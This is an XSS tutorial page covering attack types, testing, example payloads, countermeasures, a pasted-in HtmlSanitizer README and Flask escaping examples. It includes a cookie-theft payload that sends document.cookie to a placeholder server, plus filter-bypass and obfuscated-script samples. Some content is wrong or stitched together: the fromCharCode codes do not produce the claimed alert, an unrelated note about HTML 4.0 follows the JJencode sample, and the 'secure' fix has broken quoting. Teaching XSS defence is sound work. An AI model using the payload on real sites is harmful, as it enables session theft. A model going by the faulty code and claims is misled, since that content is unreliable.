# XSS 

## Lexic

* [JavaScript](items/javascript.md)
* [Cookies](items/cookies.md)
* [Web Client](items/web_client.md)
* [Web Server](items/web_server.md)
* [XMLHttpRequest](items/xhr.md)
* [WAF](items/waf.md)
* [Proxy](items/proxy.md)
* [SOP](items/sop.md)
* [HTML](items/html.md)
* [DOM](items/dom.md)

## Nomenclature 
### XSS stands for:
Cross Site Scripting
### Exploitability
Easy / Medium / Difficult according to the context
### Impact : 
Several: `disfigurements, theft of cookie, unauthorized files access, DoS, control victim browser, ` 
# Cross Site Scripting 
-----
## Overview 
The XSS attack is an attack realized when data submit from end user is `interpretted by a browser` through [Javascript](items/javascript.md) language mostly.
It is classified among `injection attacks`.  Early on, it was categorized as **three** kinds, `stored`, `DOM based` and `reflected`. 
* These three types were defined as follows :

  * __Stored XSS__: generally occurs when server stocks submitted data from one user and then this data could be seen by others users : in a message log, in user log, in user credentials, in message form, in user cv.
 
 `Client -> Server -> Users of the site (possibily including attacker)`

  * __Reflected XSS__ : when the user supplied data is automatically replied to the same user without escapping from the server.
 
 `Client -> Server -> Client`

  * __DOM based XSS__ : when the user input is not sent to the server but is used to automatically update its `DOM`.
 
 `Client -> Client`

* This classification was quickly deprecated. To clarify it, the research community proposed two new terms to help organize the types of XSS that can occur :
  * **Server XSS**
  * **Client XSS**

### Server XSS 
---
Server XSS occurs when untrusted data from user is replied with server generated HTML. In this case, the entire vulnerability is in **server-side code**, and the browser is simply rendering the response and executing any valid script embedded within it.

### Client XSS
----
Client XSS occurs when `untrusted data` is used to update the `DOM` with an unsafe call of **client-side script**. 

## How to test for XSS 
* `Graybox` test is the best way to test for XSS. Each HTTP data input and printed after could possibly be an XSS attack vector if the input is not escapped. 
For example this code is vulnerable.
```
    <?php
    echo 'Hello <h1>' .$_GET["name"]. '!</h1>';
    ?>
```
If the value of name is ```</h1><script>alert('xss');</script><h1>``` the browser will get the following answer from the server 
```
    <h1>!</h1>
    <script>alert('xss');</script>
    <h1></h1>
```	


* The best way to perform `black blackbox` XSS test in server is to use a `proxy`, `dirbust` the website and `analyze` all submitted data to the server and inject some HTML characters and analyse the server responses. Submit to check :
  * HTTP headers
  * URL parameters, query string
  * Request body, form data
  * Cookies, API storage 

From all the website submits listed, test with HTML chars (html entities), and look the render in browser. If it is not well escaped (the result is not HTML special character), probably the website is XSS vulnerable.

 
---
## Examples     
### Example 1 : cookie theft 
This code will send the cookie of the user who visit the website containing this payload. 

```
    <img src="nonExistImg" onerror="myFunction()"/>
    <script>function myFunction(){
	window.location = "http://myServer/?cookie".concat("=", document.cookie);
	}
    </script>
```

### Example 2 : XSS with weak js function 

```	
    myFunction(){
	myImg.src = document.getElementById('imgId').value; 
	document.body.appendChild(myImg); 
	}

```
If the user sends ```'); alert('xss'); document.getElement('``` the code will become ```myImg.src = document.getElementById(''); alert('xss'); document.getElementById('imgId').value;```

### Example 3 : Bad escapping
```
   myFunction(){
	userInputEscapped = userInput.replace('<script>', ' ');
	document.appendChild(userInputEscapped);
	}

```
This function appends to the document body the user input. It replaces the user input containing <script> by " ". 
For example, if a user inputs ```<script>alert("test");</script>``` the result will be ```alert("test");``` and then will not be executed.
This kind of escapping is very unuseful. If the attacker choose ```<SCRIPT>alert('test');</SCRIPT>``` the replace method is case sensitive, so the js script will be executed. 
``` 
myFunction(){
	userInputEscapped = userInput.replace('"', ' '); 
	document.body.appendChild(userInputEscapped); 
	}
  ```
In this example the quote char is replaced with ' '. An attacker could attack this implementation by using ```String.fromCharCode(35,120,115,115,34);``` to get ```alert("XSS")```.

### Obfuscation
`Obfuscation` is the deliberate act of creating source or machine code that is difficult for humans to understand. Like obfuscation in natural language, it may use needlessly roundabout expressions to compose statements. Programmers may deliberately obfuscate code to conceal its purpose (security through obscurity) or its logic or implicit values embedded in it, primarily, in order to prevent tampering, deter reverse engineering, or even as a puzzle or recreational challenge for someone reading the source code. This can be done manually or by using an automated tool, the latter being the preferred technique in industry.
#### Example:
Let's assume the following script:
```
alert("Hello, JavaScript" );
```
After an obfuscation with [JJencode](http://utf-8.jp/public/jjencode.html); it looks like:
```
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:
(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+
($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")
[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_]
[$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"(\\\"\\"+$.__$+$.__$+$.___+$.$$$_+
(![]+"")[$._$_]+(![]+"")[$._$_]+$._$+",\\"+$.$__+$.___+"\\"+$.__$+$.__$+$._$_+$.$_$_+"\\"+$.__$+$.$$_+$.$$_+$.$_$_+"
\\"+$.__$+$._$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"
\\\"\\"+$.$__+$.___+")"+"\"")())();
```
Note : Note that the **ENCODED** above does not appear in encoded files, rather it is the location where the encoded 
host code would appear. Also note that this algorithm does not work in direct mode (that is, putting it in a .js won’t 
work) because it requires a feature that was introduced in HTML 4.0. As a result, it must appear in an HTML page, and that HTML page must declare its need for HTML 4.0 or later using a declaration like this:
```<!DOCTYPE html PUBLIC “-//W3C//DTD HTML 4.0//EN”>```
The **HTML 4.0** 4.0’ string can be replaced by later versions, such as ‘HTML 4.1’ or ‘XHTML 1.0’, etc.

## Counter Measures
* **Rule #1**: **NEVER** trust client. Always perform `input validation` at every single posted by the user to the server. This includes `escaping`, `filtering` and checking everything related to data submit.
* **Rule #2**: Always update `plugins`, `modules`, `core` and all plugged packaged being used in web systems. Indeed, this contributes in limiting XSS flaws risks. This requires mastering and knowing each item used in the system/web site.
* **Rule #3**: `Disable`/`remove` unuseful features/modules cause `more one's web site embeds packages, higher is the risk of XSS vulnerability presence` mostly in CMSs.
* **Rule #4**: Think of using a [WAF](items/waf.md) and think of `deofuscation` methods.
* **Rule #5**: Implement [SOP](items/sop.md) policy `properly`.
 
 Now let's pick up some server side programming languages for more `accurate ` counter measures implementations.
 ### PHP
 -----
 
 ### ASP.Net
 -----
 
 ### C#
 -----
 HtmlSanitizer
=============

HtmlSanitizer is a .NET library for cleaning HTML fragments and documents from constructs that can lead to [XSS attacks](https://en.wikipedia.org/wiki/Cross-site_scripting).
It uses [AngleSharp](https://github.com/AngleSharp/AngleSharp) to parse, manipulate, and render HTML and CSS.

Because HtmlSanitizer is based on a robust HTML parser it can also shield you from deliberate or accidental
"tag poisoning" where invalid HTML in one fragment can corrupt the whole document leading to broken layout or style.

In order to facilitate different use cases, HtmlSanitizer can be customized at several levels:
   
- Configure allowed HTML tags through the property `AllowedTags`. All other tags will be stripped.
- Configure allowed HTML attributes through the property `AllowedAttributes`. All other attributes will be stripped.
- Configure allowed CSS property names through the property `AllowedCssProperties`. All other styles will be stripped.
- Configure allowed CSS [at-rules](https://developer.mozilla.org/en-US/docs/Web/CSS/At-rule) through the property `AllowedAtRules`. All other at-rules will be stripped.
- Configure allowed URI schemes through the property `AllowedSchemes`. All other URIs will be stripped.
- Configure HTML attributes that contain URIs (such as "src", "href" etc.) through the property `UriAttributes`.
- Provide a base URI that will be used to resolve relative URIs against.
- Cancelable events are raised before a tag, attribute, or style is removed.

#### Tags allowed by default
`a, abbr, acronym, address, area, article, aside, b, bdi, big, blockquote, br, button, caption, center, cite, code, col, colgroup, data, datalist, dd, del, details, dfn, dir, div, dl, dt, em, fieldset, figcaption, figure, font, footer, form, h1, h2, h3, h4, h5, h6, header, hr, i, img, input, ins, kbd, keygen, label, legend, li, main, map, mark, menu, menuitem, meter, nav, ol, optgroup, option, output, p, pre, progress, q, rp, rt, ruby, s, samp, section, select, small, span, strike, strong, sub, summary, sup, table, tbody, td, textarea, tfoot, th, thead, time, tr, tt, u, ul, var, wbr`

#### Attributes allowed by default
`abbr, accept, accept-charset, accesskey, action, align, alt, autocomplete, autosave, axis, bgcolor, border, cellpadding, cellspacing, challenge, char, charoff, charset, checked, cite, clear, color, cols, colspan, compact, contenteditable, coords, datetime, dir, disabled, draggable, dropzone, enctype, for, frame, headers, height, high, href, hreflang, hspace, ismap, keytype, label, lang, list, longdesc, low, max, maxlength, media, method, min, multiple, name, nohref, noshade, novalidate, nowrap, open, optimum, pattern, placeholder, prompt, pubdate, radiogroup, readonly, rel, required, rev, reversed, rows, rowspan, rules, scope, selected, shape, size, span, spellcheck, src, start, step, style, summary, tabindex, target, title, type, usemap, valign, value, vspace, width, wrap`

_Note:_ to prevent [classjacking](https://html5sec.org/#123) and interference with classes where the sanitized fragment is to be integrated, the `class` attribute is not in the whitelist by default. 
It can be added as follows:
```C#
var sanitizer = new HtmlSanitizer();
sanitizer.AllowedAttributes.Add("class");
var sanitized = sanitizer.Sanitize(html);
```

#### CSS properties allowed by default
`background, background-attachment, background-color, background-image, background-position, background-repeat, border, border-bottom, border-bottom-color, border-bottom-style, border-bottom-width, border-collapse, border-color, border-left, border-left-color, border-left-style, border-left-width, border-right, border-right-color, border-right-style, border-right-width, border-spacing, border-style, border-top, border-top-color, border-top-style, border-top-width, border-width, bottom, caption-side, clear, clip, color, content, counter-increment, counter-reset, cursor, direction, display, empty-cells, float, font, font-family, font-size, font-style, font-variant, font-weight, height, left, letter-spacing, line-height, list-style, list-style-image, list-style-position, list-style-type, margin, margin-bottom, margin-left, margin-right, margin-top, max-height, max-width, min-height, min-width, opacity, orphans, outline, outline-color, outline-style, outline-width, overflow, padding, padding-bottom, padding-left, padding-right, padding-top, page-break-after, page-break-before, page-break-inside, quotes, right, table-layout, text-align, text-decoration, text-indent, text-transform, top, unicode-bidi, vertical-align, visibility, white-space, widows, width, word-spacing, z-index`

#### CSS at-rules allowed by default
`namespace, style`

`style` refers to style declarations within other at-rules such as `@media`. Disallowing `@namespace` while allowing other types of at-rules can lead to errors.
Property declarations in `@font-face` and `@viewport` are not sanitized.

_Note:_ the `style` tag is disallowed by default.

#### URI schemes allowed by default
``http, https``

_Note:_ [Protocol-relative URLs](http://en.wikipedia.org/wiki/Wikipedia:Protocol-relative_URL)  (e.g. <a href="//github.com">//github.com</a>) are allowed by default (as are other relative URLs).

to allow `mailto:` links: 

```C#
sanitizer.AllowedSchemes.Add("mailto");
```

#### Default attributes that contain URIs
`action, background, dynsrc, href, lowsrc, src`

#### Thread safety

The `Sanitize()` and `SanitizeDocument()` methods are thread-safe, i.e. you can use these methods on a single shared instance from different threads provided you do not simultaneously set instance or static properties. A typical use case is that you prepare an `HtmlSanitizer` instance once (i.e. set desired properties such as `AllowedTags` etc.) from a single thread, then call `Sanitize()`/`SanitizeDocument()` from multiple threads.

#### Text content not necessarily preserved as-is

Please note that as the input is parsed by AngleSharp's HTML parser and then rendered back out, you cannot expect the text content to be preserved exactly as it was input, even if no elements or attributes were removed. Examples:

- `4 < 5` becomes `4 &lt; 5`
- `<SPAN>test</p>` becomes `<span>test<p></p></span>`
- `<span title='test'>test</span>` becomes `<span title="test">test</span>`

On the other hand, although some broken HTML is fixed by the parser, the output might still contain invalid HTML. Examples:

- `<div><li>test</li></div>`
- `<ul><br><li>test</li></ul>`
- `<h3><p>test</p></h3>`

##### Usage
-----

Install the [HtmlSanitizer NuGet package](https://www.nuget.org/packages/HtmlSanitizer/). Then:

```C#
var sanitizer = new HtmlSanitizer();
var html = @"<script>alert('xss')</script><div onload=""alert('xss')"""
    + @"style=""background-color: test"">Test<img src=""test.gif"""
    + @"style=""background-image: url(javascript:alert('xss')); margin: 10px""></div>";
var sanitized = sanitizer.Sanitize(html, "http://www.example.com");
Assert.That(sanitized, Is.EqualTo(@"<div style=""background-color: test"">"
    + @"Test<img style=""margin: 10px"" src=""http://www.example.com/test.gif""></div>"));
```

There's an [online demo](http://xss.ganss.org/), plus there's also a [.NET Fiddle](https://dotnetfiddle.net/qqpiDh) you can play with.

#### Reference
[OWASP Html C# Sanitizer](https://github.com/mganss/HtmlSanitizer/edit/master/README.md)


 ### Java
 -----
 
 ### Node.JS
 -----
 
 ### Python
 -----
 
  #### Incorrect
  In this part, we will be dealing the Python [Flask library](items/flask.md).
The following is a contrived example of how a **reflected XSS** exploit may occur. If an attacker were to submit a request to `http://example.com/?name=<script>alert(1)</script>` then any user viewing that url would have the javascript executed within the context of their browser.
```
# flask example
@app.route("/")
def hello():
    name = request.args.get('name')
    return "Hello %s" % name
```
  #### Correct
The correct way to prevent XSS attacks is to validate user input and ensure that data rendered by templates is escaped. Using templates in the way they are intended is preferable:
```
# flask example
@app.route("/")
def hello():
    name = request.args.get('name')
    return render('hello.html', name=name)

# where hello.html is:
# <html>Hello {{ name }}</html>
```

Any HTML content that is generated directly within a request handler should use the appropriate escaping function:
```
from flask import escape
@app.route("/")
def hello():
    name = request.args.get('name')
    return "Hello %s" % escape(name)
```
  #### Allowing certain special characters
  The issue is made more complex when we encounter situations where `we need to allow a specific set of special characters, such as the ability to post content containing HTML tags`. In this situation we can either:
  * accept only known good data, 
  * or we can deny all known bad data. 
  Both approaches have pros and cons, with the specific choice of implementation being dependent on the given application. In general however, the following should be the list of priorities:

* **Encoding** - Replace ALL control characters with known safe alternatives
* **Positive validation (whitelist)** - Only allow a specific set of values
* **Negative validation (blacklist)** - Block a specified list of dangerous values

In cases where `positive validation` is used, it should also be coupled with additional sanitization. For example, when allowing certain HTML tags, certain attributes of those tags should be removed, such as event handlers. e.g.:
```
<img src='someimage.jpg' onload='do_evil()'/>
```
Again, the preferable approach is to only `allow known safe attributes`, and sanitize the content of those attribute values. If the content is not sanitized, the following vulnerable code could occur:
```
function add_image(link) {
  document.write('<img src="' + link + '"'></img>'');
}
```
If the preceding JavaScript function is called with the link parameter containing the following value, the function can be exploited to execute arbitrary code:
```
x" onerror="do_evil()
```
A more secure implementation of the above would be:
```
function add_image(link) {
  clean = link.replace(/"/g, '&quot;');
  document.write('<img src="' + clean + '"'></img>'');
}
Note, this is a very specific example for illustration. A more comprehensive approach to sanitization should be taken for larger applications.
```
[Here](items/activates.md) is properly enough written library to help defend against XSS injections.
